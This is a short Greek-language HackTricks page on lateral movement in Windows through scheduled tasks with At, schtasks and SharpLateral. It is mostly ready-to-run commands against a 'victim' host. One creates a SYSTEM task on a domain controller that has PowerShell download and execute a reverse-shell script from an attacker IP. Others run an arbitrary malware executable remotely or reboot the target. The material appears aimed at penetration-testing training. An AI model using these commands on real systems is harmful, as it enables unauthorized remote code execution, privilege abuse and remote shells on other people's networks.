# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Πώς Λειτουργεί

Το At επιτρέπει τον προγραμματισμό εργασιών σε υπολογιστές όπου γνωρίζετε το όνομα χρήστη/(κωδικό πρόσβασης/Hash). Έτσι, μπορείτε να το χρησιμοποιήσετε για να εκτελέσετε εντολές σε άλλους υπολογιστές και να λάβετε την έξοδο.
```
At \\victim 11:00:00PM shutdown -r
```
Χρησιμοποιώντας το schtasks, πρέπει πρώτα να δημιουργήσετε την εργασία και στη συνέχεια να την καλέσετε:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Μπορείτε επίσης να χρησιμοποιήσετε [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Περισσότερες πληροφορίες σχετικά με τη [**χρήση του schtasks με ασημένια εισιτήρια εδώ**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
